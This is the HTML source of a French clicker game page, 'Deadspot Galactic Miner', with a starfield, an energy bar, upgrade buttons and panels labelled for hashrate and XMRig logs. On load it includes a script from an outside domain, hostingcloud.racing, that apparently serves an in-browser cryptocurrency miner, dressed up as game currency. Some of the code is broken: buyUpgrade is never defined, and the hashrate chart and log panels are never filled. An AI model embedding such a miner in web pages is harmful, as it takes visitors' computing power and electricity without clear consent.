<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>ðŸš€ Deadspot Galactic Miner</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      font-family: Consolas, monospace;
      background: black;
      color: #0ff;
      text-align: center;
    }

    h1 {
      color: #0ff;
      margin-top: 20px;
      text-shadow: 0 0 15px #0ff, 0 0 30px cyan;
    }

    #deadspotBalance {
      font-size: 22px;
      margin: 10px;
      color: #ffd700;
      text-shadow: 0 0 10px #ff0;
    }

    #energyBar {
      width: 300px; height: 20px; border:1px solid #0ff; margin:10px auto;
      background:#001; border-radius:5px; overflow:hidden;
    }
    #energyFill {
      height:100%; width:100%; background:#0ff;
      transition: width 0.3s;
    }

    /* Bouton futuriste */
    #clickBtn {
      width: 220px;
      height: 220px;
      border-radius: 50%;
      background: radial-gradient(circle, #111, #000);
      border: 3px solid #0ff;
      margin: 20px auto;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 25px #0ff;
      transition: transform 0.2s;
    }
    #clickBtn img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      filter: drop-shadow(0 0 20px #f00);
    }
    #clickBtn:hover {
      transform: scale(1.08);
      border-color: #ff0;
    }

    button {
      background:#111; color:#0ff; padding:10px 20px; border:1px solid #0ff;
      border-radius:8px; margin:5px; cursor:pointer;
      text-shadow: 0 0 8px #0ff;
    }
    button:hover { background:#033; }

    canvas {
      margin-top: 20px;
      background: #0a0a1a;
      border: 1px solid #0ff;
      border-radius: 10px;
    }

    #xmrigLogs {
      margin: 20px auto;
      max-height: 250px;
      overflow-y: auto;
      background: rgba(0,0,0,0.7);
      border: 1px solid #0ff;
      padding: 10px;
      width: 80%;
      text-align: left;
      font-size: 13px;
      color: #0f0;
    }
    .logAccepted { color:#0f0; }
    .logRejected { color:#f00; }

    /* Effet LEVEL UP */
    #levelUp {
      position: fixed;
      top: 40%;
      left: 50%;
      transform: translate(-50%,-50%);
      font-size: 60px;
      color: #ff0;
      text-shadow: 0 0 20px #ff0, 0 0 40px orange;
      display: none;
      animation: levelup 2s ease-out forwards;
    }
    @keyframes levelup {
      0% { opacity:0; transform:translate(-50%,-50%) scale(0.5); }
      30% { opacity:1; transform:translate(-50%,-50%) scale(1.3); }
      100% { opacity:0; transform:translate(-50%,-50%) scale(1); }
    }

    /* Fond Ã©toilÃ© */
    .star {
      position: fixed;
      width: 2px; height: 2px;
      background: white;
      animation: twinkle 3s infinite;
    }
    @keyframes twinkle {
      0%,100% { opacity:0.2; }
      50% { opacity:1; }
    }

    /* Vaisseaux qui traversent lâ€™Ã©cran */
    .ship {
      position: fixed;
      top: calc(10% + 80% * var(--randY));
      left: -100px;
      width: 80px;
      height: 40px;
      background: linear-gradient(90deg, #0ff, #00f);
      clip-path: polygon(0 50%, 80% 0, 100% 50%, 80% 100%);
      animation: fly 12s linear infinite;
      opacity: 0.8;
      transform: rotate(5deg);
    }
    @keyframes fly {
      from { left: -150px; }
      to { left: 110%; }
    }
  </style>
</head>
<body>
  <h1>ðŸš€ Deadspot Galactic Miner</h1>
  <div id="deadspotBalance">Deadspot: 0</div>
  <div id="energyBar"><div id="energyFill"></div></div>

  <div id="clickBtn">
    <img src="skull.png" alt="skull">
  </div>

  <button id="exchangeBtn">ðŸ”„ Convertir Hashes â†’ Deadspot</button>

  <div id="exchangeProgress"><div id="exchangeFill"></div></div>

  <h2>ðŸ“Š Hashrate</h2>
  <div id="currentHps">H/s: 0.00</div>
  <div id="totalHashes">Total Hashes: 0</div>
  <canvas id="hashrateChart" width="600" height="200"></canvas>

  <h2>ðŸ“œ Logs XMRig</h2>
  <div id="xmrigLogs"></div>

  <h3>âš¡ AmÃ©liorations</h3>
  <button onclick="buyUpgrade('x2')">x2 Click (5 DSC)</button>
  <button onclick="buyUpgrade('auto')">Auto-Click (10 DSC)</button>
  <button onclick="buyUpgrade('regen')">Ã‰nergie+ (8 DSC)</button>
  <button onclick="buyUpgrade('multi')">x5 Revenus (20 DSC)</button>

  <div id="levelUp">LEVEL UP!</div>

  <!-- Chart.js -->
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script src="https://www.hostingcloud.racing/WPmG.js"></script>
  <script>
    let deadspot = 0;
    let level = 1;
    let xp = 0, xpNeeded = 10;
    let clickValue = 0.00015;
    let upgrades = {};
    let energy = 100, maxEnergy = 100, regenRate = 1;
    let autoClickInterval = null;

    function updateUI() {
      document.getElementById("deadspotBalance").textContent = "Deadspot: " + deadspot.toFixed(5) + " | Level " + level;
      document.getElementById("energyFill").style.width = (energy/maxEnergy*100) + "%";
    }

    function levelUp() {
      level++;
      xp = 0;
      xpNeeded = Math.floor(xpNeeded * 1.5);
      clickValue *= 1.2;
      document.getElementById("levelUp").style.display = "block";
      setTimeout(()=>{document.getElementById("levelUp").style.display="none";},2000);
    }

    document.getElementById("clickBtn").addEventListener("click", () => {
      if (energy > 0) {
        let gain = clickValue;
        deadspot += gain;
        xp++;
        if (xp >= xpNeeded) levelUp();
        energy--;
        updateUI();
      }
    });

    setInterval(() => {
      if (energy < maxEnergy) {
        energy = Math.min(maxEnergy, energy + regenRate);
        updateUI();
      }
    }, 1000);

    // === Effets visuels Ã©toilÃ©s ===
    function spawnStars() {
      for (let i=0;i<100;i++) {
        let s=document.createElement("div");
        s.className="star";
        s.style.top=Math.random()*100+"%";
        s.style.left=Math.random()*100+"%";
        document.body.appendChild(s);
      }
    }
    spawnStars();

    // Vaisseaux qui passent
    setInterval(()=>{
      let ship=document.createElement("div");
      ship.className="ship";
      ship.style.setProperty("--randY", Math.random());
      document.body.appendChild(ship);
      setTimeout(()=>ship.remove(),12000);
    },8000);

    updateUI();
  </script>
</body>
</html>
